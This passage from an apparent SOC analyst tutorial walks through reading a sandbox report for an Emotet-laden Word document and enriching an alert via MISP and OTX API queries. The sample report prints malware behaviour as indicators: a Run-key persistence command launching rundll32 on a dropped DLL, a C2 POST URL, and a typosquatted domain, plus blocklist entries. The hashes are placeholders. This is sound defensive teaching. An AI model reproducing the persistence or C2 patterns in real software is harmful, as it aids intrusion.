# => submit hashes to VirusTotal, MISP, or internal TI platform
# => example: sha256: a3f2c1d4e5b6... → known Cobalt Strike beacon DLL
```

**Key Takeaway:** Supertimeline generation with log2timeline correlates filesystem timestamps across all artifact types, producing a chronological reconstruction of attacker activity that reveals the full intrusion sequence including file drops, execution, and deletion.

**Why It Matters:** Disk forensics recovers evidence that attackers assume is gone — deleted malware, overwritten log fragments, and files staged briefly before execution. The timeline approach is particularly powerful because it correlates event log entries, registry changes, prefetch files, and filesystem timestamps into a single chronological view, making it straightforward to identify the initial access event, the lateral movement path, and the persistence mechanism even weeks after the incident. Forensic images must be captured before remediation begins.

---

## Example 56: Malware Sandbox Analysis — Reading a Joe Sandbox or ANY.RUN Report

**What this covers:** Sandbox analysis executes a suspicious file in an isolated environment and records all behaviors: processes created, files written, registry modifications, network connections, and DNS queries. Reading a sandbox report effectively — focusing on the behavioral summary, network indicators, and dropped artifacts rather than the raw API call log — enables rapid triage and IOC extraction for SIEM enrichment and threat intelligence sharing.

**Scenario:** A phishing analyst receives a suspicious `.docm` attachment and submits it to ANY.RUN for automated behavioral analysis, then reviews the report to extract IOCs and assess the threat.

```yaml
# Sample Sandbox Report Interpretation Guide
# Based on ANY.RUN / Joe Sandbox report structure
# File: invoice_may2026.docm | SHA256: d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5

report_summary:
  verdict: MALICIOUS          # => automated verdict based on behavioral signatures
  threat_name: "Emotet"       # => detected malware family; cross-reference with CTI
  detection_score: 94/100     # => confidence score; >80 = high confidence malicious
  # => always verify verdict manually — false positives occur with new/obfuscated malware

process_tree:
  - winword.exe               # => document opened in Word
    - cmd.exe                 # => macro spawned cmd.exe — immediate red flag (see Example 35)
      - powershell.exe        # => PowerShell launched for stager download
        - rundll32.exe        # => rundll32 used to load downloaded DLL in memory
  # => this tree matches known Emotet macro -> PowerShell -> rundll32 chain

network_indicators:
  dns_queries:
    - "updates.micros0ft-cdn.com"   # => typosquatted domain — note zero replacing 'o'
    - "185.220.101.42"              # => direct-IP C2 communication (no DNS)
  http_requests:
    - method: POST
      url: "http://185.220.101.42:8080/api/v1/tasks"
      # => POST to /api/v1/tasks is Emotet's task retrieval endpoint
      # => submit this URL pattern to MISP as a network indicator
  established_connections:
    - "185.220.101.42:8080 (ESTABLISHED)"   # => primary C2 channel

file_system_changes:
  dropped_files:
    - path: "C:\\Users\\user\\AppData\\Roaming\\Emotet.dll"
      sha256: "f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
      # => dropped DLL is the main payload; submit hash to SIEM blocklist
  registry_changes:
    - key: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
      value: "Emotet"
      data: "rundll32.exe C:\\Users\\user\\AppData\\Roaming\\Emotet.dll,Control_RunDLL"
      # => persistence via Run key (see Example 38)

ioc_extraction:
  hashes:
    - "d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5"  # document
    - "f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7"  # dropped DLL
  ips:
    - "185.220.101.42"              # => add to SIEM TI lookup and firewall block list
  domains:
    - "updates.micros0ft-cdn.com"  # => add to DNS blocklist and SIEM TI lookup
```

**Key Takeaway:** The process tree, network indicators, and dropped file hashes from a sandbox report are the three highest-value outputs for immediate threat response — use them to scope SIEM searches, update threat intelligence feeds, and brief containment actions.

**Why It Matters:** Sandbox analysis compresses hours of manual reverse engineering into minutes of automated behavioral analysis, enabling even tier-1 analysts to extract actionable IOCs and understand the malware's capabilities. The extracted indicators feed directly into SIEM threat intelligence enrichment (as in Examples 36, 42, and 44), firewall block rules, and MISP sharing with partner organizations. Understanding how to read a sandbox report — particularly the process tree and network section — is one of the highest-leverage skills a SOC analyst can develop.

---

## Example 57: Threat Intelligence Integration — Enriching an Alert with MISP or OTX IOC Lookup

**What this covers:** Threat intelligence (TI) integration enriches SIEM alerts with context from IOC databases — determining whether a suspicious IP, domain, or file hash has been reported by other organizations as malicious, including the associated threat actor, malware family, and campaign details. This example shows how to query MISP's REST API and OTX's API from a SIEM enrichment script and interpret the results.

**Scenario:** A SIEM alert fires for an outbound connection to `185.220.101.42` (from Example 42). An analyst enriches it with MISP and OTX lookups to determine if this IP is associated with a known threat actor or campaign.

```bash
# ============================================================
# THREAT INTELLIGENCE ENRICHMENT — MISP + OTX API lookup
# Used during alert triage to add context before analyst escalation
# ============================================================

MISP_URL="https://misp.corp.example"
MISP_KEY="YOUR_MISP_API_KEY"          # => store in secrets manager, not plaintext
OTX_KEY="YOUR_OTX_API_KEY"            # => AlienVault OTX API key from otx.alienvault.com
SUSPECT_IP="185.220.101.42"
SUSPECT_HASH="d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5"

# ---- MISP: Search for the IP across all events ----
curl -s -H "Authorization: ${MISP_KEY}" \
     -H "Accept: application/json" \
     -H "Content-Type: application/json" \
     -d "{\"returnFormat\":\"json\",\"value\":\"${SUSPECT_IP}\",\"type\":\"ip-dst\"}" \
     "${MISP_URL}/attributes/restSearch" | jq '.response.Attribute[] |
       {event_id: .event_id, category: .category, type: .type, value: .value,
        comment: .comment, timestamp: (.timestamp | tonumber | todate)}'
# => returns MISP attribute matches: which events reference this IP
# => .category = "Network activity", .type = "ip-dst" = destination IP IOC
# => .comment may include actor attribution or campaign name
# => example output:
#    {"event_id":"1423","category":"Network activity","type":"ip-dst",
#     "value":"185.220.101.42","comment":"Emotet C2 — TA542","timestamp":"2026-04-01"}
#    => TA542 = Mealybug/Emotet threat actor; confirms C2 activity

# ---- OTX: Look up the IP in AlienVault OTX ----
curl -s -H "X-OTX-API-KEY: ${OTX_KEY}" \
     "https://otx.alienvault.com/api/v1/indicators/IPv4/${SUSPECT_IP}/general" \
     | jq '{pulse_count: .pulse_info.count,
            pulses: [.pulse_info.pulses[] | {name: .name, tags: .tags, modified: .modified}],
            country: .country_name, asn: .asn}'
# => pulse_count = how many OTX community threat reports reference this IP
# => high pulse_count (>10) = well-known malicious IP
# => individual pulse names and tags reveal associated campaigns and malware families

# ---- Hash lookup in OTX ----
curl -s -H "X-OTX-API-KEY: ${OTX_KEY}" \
     "https://otx.alienvault.com/api/v1/indicators/file/${SUSPECT_HASH}/general" \
     | jq '{malware_families: .malware_families, pulse_count: .pulse_info.count,
            first_seen: .first_seen}'
# => malware_families array identifies known malware associated with this hash
# => first_seen tells you when the sample was first observed in the wild
# => example: {"malware_families":["Emotet"],"pulse_count":47,"first_seen":"2026-03-15"}

# ---- Consolidated enrichment output for SIEM annotation ----
echo "IP: ${SUSPECT_IP}"
echo "MISP: TA542 (Emotet C2), first seen 2026-04-01"
echo "OTX: 47 pulses, Emotet malware family, AS209 (CenturyLink)"
echo "Verdict: CONFIRMED MALICIOUS — Escalate to Tier 2, initiate containment"
# => this output feeds into the SIEM alert annotation and SOAR ticket
```

**Key Takeaway:** Enriching SIEM alerts with MISP and OTX lookups at triage time converts raw IOCs into attributed threat actor context, enabling analysts to make faster, better-informed escalation decisions.

**Why It Matters:** Threat intelligence integration transforms isolated alert data into contextualized threat intelligence: knowing that an IP belongs to the Emotet C2 infrastructure changes the response from "investigate unknown connection" to "activate Emotet incident response playbook and check for additional infected hosts." MISP's organization-private event sharing also enables coordinated industry response — when your SIEM detects an IOC that you share back to MISP, partner organizations benefit within hours. Building TI enrichment into SOAR playbooks eliminates manual lookup steps and reduces analyst workload at scale.
